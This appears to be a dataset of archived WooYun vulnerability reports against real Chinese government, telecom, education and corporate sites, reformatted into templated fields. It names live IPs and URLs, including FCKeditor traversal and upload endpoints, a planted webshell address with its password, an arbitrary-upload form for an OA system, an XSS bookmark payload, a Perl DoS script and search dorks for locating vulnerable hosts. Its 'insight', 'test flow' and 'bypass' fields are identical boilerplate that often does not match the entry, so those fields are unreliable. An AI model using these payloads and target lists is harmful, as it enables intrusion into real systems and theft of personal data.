**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 审核的领导你好，我看了你指出的重复漏洞id:109554，我和该漏洞提出的问题是不相同的，我指出的是fck编辑器的问题，上传点和漏洞id:109554的完全不同，并且我提出的是fck任意文件遍历问题，也和其任意文件下载不同。审核的领导辛苦了，求再审核，找到一个漏洞不容易。目标地址：http://219.131.221.59:8080/fck编辑器地址：http://219.131.221.59:8080/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../可跨目录

**POC**: fck上传地址，可直接上传jsp文件http://219.131.221.59:8080/FCKeditor/editor/filemanager/browser/default/browser.html?Type=&Connector=connectors/jsp/connector可以看到上传的路径都和漏洞id:109554不一样的。我不骗人大马：http://219.131.221.59:8080/UserFiles/File/01test10.jsp密码：520o520

**绕过**: 直接利用

**修复**: fck上传点过滤jsp等正确配置fck编辑器
---

---
### [wooyun-2014-068861] 某通用性cms任意文件上传漏洞
**厂商**: cncert | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 影响范围：国家数字化学习资源中心1.国家数字化学习资源中心(http://www.nerc.edu.cn/)2.国家数字化学习资源中心-山西中心(http://218.26.168.18/)3.国家数字化学习资源中心-天津中心(http://nerc.tjedu.cn/)4.国家数字化学习资源中心-内蒙古中心(http://202.207.96.8/)5.国家数字化学习资源中心-江苏中心(http://nerc.jstvu.edu.cn/)6.国家数字化学习资源中心-安徽中心(http://218.22.21.231/)我直接用一张图说明了吧！上面截图里面全是用的一套cms！

**POC**: 我们拿福建中心来做演示：1.注册用户2.我的资源库入口3.资源供需-发布供需信息这样就成功拿到webshell了！

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-010617] 某市建设网存在多处严重漏洞
**厂商**: 济南市信息建设网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试对象：济南市建设信息网1.前台sql注射；2.后台万能密码登陆；3.后台任意文件上传（测试时没能成功利用）；4.目录遍历；5.房地产行业管理信息系统未授权访问（不知道是否已正式上线）；

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0134284] 车猫网一个小问题而导致的蝴蝶效应（安全无止境漏洞无大小）
**厂商**: dongdalou.com | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 上传功能

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一个很小很小的漏洞····http://cert.chemao.com.cn/.svn/entries   存在.svn漏洞然后就各种happy  各种嗨了····先不看别的  先看看 config  也就是各种配置吧配置信息真多（以下截图为敏感信息 不上传漏洞肯定不通过  所以抱歉了 为了保护隐私  我帮你打下马赛克吧）邮箱配置：进入企业邮箱：ftp 配置：不太会用 ftp  将就着看吧优酷配置：可惜不是 vip还有些其他信息 就不截图了  我这人懒

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 话说厂商会送我小礼物不？开个玩笑  不送也没关系  只要不送水表就行了PS：只检测 未利用 所有敏感信息都没有保存
---

---
### [wooyun-2015-0158336] 银泰商业某系统设计缺陷导致近6W供应商财务信息泄漏\任意操作任意商户\任意文件上传
**厂商**: 银泰商业集团 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://122.224.218.142:7070/supplier/jsp/index.jsp银泰百货供应商网上对账平台任意用户名字，任意密码返回包，改成true里面有关于i融平台，下载说明的pdf里面有注册步骤说明，跟着填写对应信息，成功注册了一个帐号

**POC**: i融平台地址http://irou.intime.com.cn:8380/supplier/jsp/main.jsp对应功能在基础信息查看时，修改商户id，就是这个修改商户id，造成了可以操作任意商户账户先看看商户的基础信息59000多商户的信息，利用id修改，可越权操作59000多商户的账户供应商月度对账供应商销售对账当日销售对账融资申请处，任意文件上传可以提前结款

**绕过**: 直接利用

**修复**: 权限控制。
---

---
### [wooyun-2015-0105300] CSDN个人空间越权获取其他账户相册图片和上传
**厂商**: CSDN开发者社区 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 进入创建相册！修改 value后面的id并且选择上传张图！全部修改完后点击  立即上传！获取出来了111111 id的几张照片  和相册名称！并且看到了我选择上传的那张！嘿嘿

**POC**: (见原文)

**绕过**: 直接利用

**修复**: csdn开发者社区我从几年前就在里面找出了很多资料！一个非常好的网站
---

---
### [wooyun-2015-0105076] 某数字化校园平台通用任意文件上传#3
**厂商**: Cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: inurl:EduPlate/HomeworkManage

**POC**: http://tywx.mhedu.sh.cn/EduPlate/HomeworkManage/ftb.insertFile.aspxhttp://xsxx.mhedu.sh.cn/EduPlate/HomeworkManage/ftb.insertFile.aspxhttp://i.goodo.com.cn/EduPlate/HomeworkManage/ftb.insertFile.aspxhttp://syxx.mhedu.sh.cn//EduPlate/HomeworkManage/ftb.insertFile.aspx......

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-044250] 联想某系统弱口令导致多站点沦陷
**厂商**: 联想 | **年份**: 2013 | **类型**: 后台弱口令

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.存在问题的站点为联想的大客户官方应用；http://app.lenovo-rel.com/admin/orderadmin1234562.用户信息；3.后台存在上传漏洞；4.权限比较大，致多站点沦陷呀；PS：这得多少用户信息呀，不深入了，求礼物~~

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 这个不用解释吧
---

---
### [wooyun-2015-0123299] 江西移动上传过滤不严导致的上传漏洞可导致大量用户信息泄露
**厂商**: 江西移动 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一次偶然的机会，发现江西移动官网存在一个编辑器上传漏洞地址是http://www.jx.10086.cn/xxt/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector详细一看，竟然还过滤不严，可上传任意文件和遍目录http://www.jx.10086.cn/xxt/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=http://www.jx.10086.cn/xxt/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector二话不说，果断上传了一个jsp一句话。没想到的在后面，。。。

**POC**: 由于只做测试就不深入下去了，望官方做好修复工作的同时也渴望乌云能给到一个邀请码，让大家在网络安全的道路上多一个伙伴。

**绕过**: 直接利用

**修复**: 修复也很简单，修改FCKeditor配置文件，增加过滤后缀即可
---

---
### [wooyun-2012-012379] 湖南省全省公民人口身份信息泄漏
**厂商**: 湘警网 | **年份**: 2012 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站非本人入侵，本人只做注入测试，图为入侵者挂上的TXT，应该是走后台的一个上传页面拿到权限，但是访问时发现被删除!http://222.247.33.3/upload.jsp 这个也是个上传http://222.247.33.4:8000 而这台服务器 可以目录遍历http://222.247.33.4:8000/bbs/test.jsp 存在爆出绝对路径 还有阿帕奇的应用也爆如果MYSQL存在写入权限入侵者可以轻易拿到服务器权限！http://222.247.33.4:8000/admin/目录下存在存在一个编辑器有安全隐患http://222.247.33.3/manage/ 这个目录存在一个上传html无需后台密码验证可上传入侵者很大可能利用此上传漏洞！http://222.247.33.3/manage/upfile.htm 发现被删除！http://222.247.33.3 公

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强后台等敏感信息泄漏！注入就不用我说了！希望能做好公民信息防护，后台最好强制使用证书！
---

---
### [wooyun-2012-010415] 中国国防类域名注册往惊现某低级漏洞可导致大量mil,国防 军事域名被挟持!(别鄙视我发这低级洞)
**厂商**: CNNIC | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.mil.cn/其实是fck漏洞 我真想不到这居然会有!!!(请别鄙视我)http://www.mil.cn/fckeditor/editor/filemanager/connectors/test.html不多说了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改fck路径 复杂点!!!清除后门!
---

---
### [wooyun-2012-07191] Uread阅读器拒绝服务漏洞
**厂商**: 至善读书 | **年份**: 2012 | **类型**: 拒绝服务

**元思考**: 触发信号: 上传功能

**洞察**: 拒绝服务防护不足，开发者信任前端输入

**测试流程**:
1. 识别拒绝服务相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Uread阅读器在远程或本地打开文件名过长（大于或等于129个字符）的upub等文件时将引起uread.exe程序无法正常工作，必须重新启动uread.exe进程方可。远程攻击者可考虑将过长文件名的文件上传至“至善读书”的服务器端，实现远程拒绝服务攻击。

**POC**: Proof Of Concept :-----------------------------------------------------------#!/usr/bin/perl -w$filename="a"x129;print "------Generate testfile \"a\"x129.epub------\n";open(TESTFILE, ">$filename.epub");sleep(3);close(TESTFILE);print "------Complete!------\n";exit(1);---------------------------------

**绕过**: 直接利用

**修复**: 目前厂商还没有提供补丁或者升级程序。
---

---
### [wooyun-2014-069243] 某地邮政OA系统任意文件上传漏洞（影响服务器安全）
**厂商**: 中国邮政集团公司信息技术局 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://61.185.27.29:8080/继续使用以前的exp:<form enctype="multipart/form-data" action="http://oa.dld.com/general/vmeet/wbUpload.php?fileName=test.php+" method="post"><input type="file" name="Filedata" size="50"><br><input type="submit" value="Upload"></form>

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级oa系统,加强服务器监管.
---

---
### [wooyun-2012-016216] 网宿科技某站点被入侵
**厂商**: 网宿科技 | **年份**: 2012 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 许久没有提交漏洞了，看看厂商列表最后一个(网宿科技)...谷歌下，找个子站：打开目标站，随便点点，发现未关闭目录浏览，同时目测存在fck编辑器...分别翻查下这几个文件夹，发现了别人的脚印...进一步证实了前面的猜测：看到这个版本号，推想攻击者很可能是利用了“fckeditor <= 2.6.4 任意文件上传漏洞”。详见WooYun: fckeditor <= 2.6.4 任意文件上传漏洞验证下，果不其然：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1、清理后门2、参照网络修补漏洞
---

---
### [wooyun-2014-063453] 乾豪综合教务管理系统数万学生信息泄漏
**厂商**: 大连乾豪软件工程有限公司 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 上传功能

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这套教务系统基于jsp+oracle开发，很多高校都在使用，如大连工业大学，沈阳工业大学，大连外语等，直接google：inurl:ACTIONSHOWNEWS，可以搜索到好多。之前拿下了一个该教务系统的服务器，苦于当时不懂java，一直没能拿到数据库的操作权限，实在是我心头一大遗憾，最近学习了一下java，又捡起了这个，才发现原来这套系统漏洞这么多，注入，任意文件上传就不说了，连数据库连接配置都可任意查看...该教务系统的数据库连接配置文件为:QHDBCONFIG.INI，直接访问教务系统网址+QHDBCONFIG.INI，就可以看到配置了。可以看到，用户名和密码是加密的，因为这个我确实头疼了好一阵，后来靠着java的一些基础，我反编译了jsp调用的包，发现了该密文的加密方式，采用了RSA算法进行加密，不过由于class文件反编译是非常方便的，所以即使采用了这种比较安全的加密算法，也没多

**POC**: 这里我随便搜索了一个，就以济南职业学院（http://edu.jnvc.cn/）做演示吧。首先访问http://edu.jnvc.cn/QHDBCONFIG.INI,可以看到，数据库连接文件已经显示出来了。接着我们解密下数据库的用户名和密码。再接下来，我们根据配置连接数据库就可以了。网络不是很好，程序假死了...不过我们仍可看到，密码都是明文保存的...我们随便登陆一个试试，很好，登陆上了。

**绕过**: 直接利用

**修复**: 这么复杂的事情，你们来想吧...
---

---
### [wooyun-2011-01668] QQ书签的一个没危害的代码执行
**厂商**: 腾讯 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 导入功能会执行导入文件中恶意构造的html执行html也是代码执行

**POC**: http://shuqian.qq.com/import.导入a.htma.htm代码<!DOCTYPE NETSCAPE-Bookmark-file-1><DL><p><DT><A HREF="<script>alert(5)</script>" ADD_DATE="1298701242" LAST_VISIT="1300550400" LAST_MODIFIED="1298701246">蚊虫</A></DL><p>即可得导入文件中的 HREF="X" 的X可以换成其他HTML标签 一样执行

**绕过**: 直接利用

**修复**: 没有危害,不用修复了,留给新人们练习漏洞挖掘把
---
